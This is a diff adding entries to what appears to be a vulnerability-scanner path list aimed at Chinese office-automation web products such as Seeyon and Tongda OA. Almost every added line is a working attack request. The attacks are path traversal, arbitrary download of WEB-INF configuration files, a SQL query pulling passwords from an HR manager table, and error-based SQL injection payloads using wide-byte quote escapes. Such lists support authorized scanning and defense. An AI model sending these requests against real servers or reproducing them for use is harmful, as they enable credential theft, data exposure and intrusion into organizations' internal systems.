@@ -16,3 +16,15 @@
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{randstr}}))
 /mainpage/msg.aspx?user=1
 /mainpage/msglog.aspx?user=1
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/
+/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
+/seeyon/main.do?method=officeDown&filename={{filepath}}
+/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+/interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
+/defaultroot/evoInterfaceServlet?paramType=user
+/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
+/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
